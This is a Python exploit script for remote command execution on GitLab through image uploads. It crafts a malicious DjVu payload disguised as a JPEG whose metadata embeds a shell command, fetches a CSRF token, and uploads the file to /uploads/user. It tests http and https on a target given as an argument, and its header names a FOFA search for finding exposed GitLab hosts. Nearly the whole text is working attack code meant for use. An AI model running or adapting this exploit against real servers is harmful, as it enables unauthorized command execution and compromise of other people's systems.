#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import re

command = 'whoami'
CSRF_PATTERN = re.compile(rb'csrf-token" content="(.*?)" />')
session = requests.session()

def title():
    print('+          FOFA: app="GitLab"')


def get_payload(command):
    try:
        rce_payload = b'\x41\x54\x26\x54\x46\x4f\x52\x4d'
        rce_payload += (len(command) + 0x55).to_bytes(length=4, byteorder='big', signed=True)
        rce_payload += b'\x44\x4a\x56\x55\x49\x4e\x46\x4f\x00\x00\x00\x0a\x00\x00\x00\x00\x18\x00\x2c\x01\x16\x01\x42\x47\x6a\x70\x00\x00\x00\x00\x41\x4e\x54\x61'
        rce_payload += (len(command) + 0x2f).to_bytes(length=4, byteorder='big', signed=True)
        rce_payload += b'\x28\x6d\x65\x74\x61\x64\x61\x74\x61\x0a\x09\x28\x43\x6f\x70\x79\x72\x69\x67\x68\x74\x20\x22\x5c\x0a\x22\x20\x2e\x20\x71\x78\x7b'
        rce_payload += command.encode()
        rce_payload += b'\x7d\x20\x2e\x20\x5c\x0a\x22\x20\x62\x20\x22\x29\x20\x29\x0a'
        return rce_payload
    except Exception as e:
        return False


def csrf_token(target):
    try:
        response = session.get(f'{target}/users/sign_in', headers={'Origin': target}, timeout=(3, 3))
        g = CSRF_PATTERN.search(response.content)
        return g.group(1).decode()
    except Exception as e:
        return False


def run_proto(target):
    try:
        if get_payload(command) and csrf_token(target):
            files = [('file', ('test.jpg', get_payload(command), 'image/jpeg'))]
            req = session.post(f'{target}/uploads/user', files=files, headers={'X-CSRF-Token': csrf_token(target)}, timeout=(3, 3))
            print('check url = {}'.format(target))
            if 'Failed to process image' in req.text:
                print("[+] 目标 {} 有漏洞".format(target))
                print("[+] 请到dnslog或主机检查执行结果")
                return True
            else:
                return False
        else:
            return False
    except Exception as e:
        print(e)


def run(ip, port):
    i = 0
    proto = ['http', 'https']
    while i < 2:
        url = '{}://{}:{}'.format(proto[i], ip, port)
        if run_proto(url):
            return True
        else:
            i = i + 1


if __name__ == '__main__':
    title()
    target = sys.argv[1]
    ip = target.split(':')[0]
    port = target.split(':')[1]

    result = run(ip, port)

    if result:
        print('Exist')
    else:
        print('UnExist')
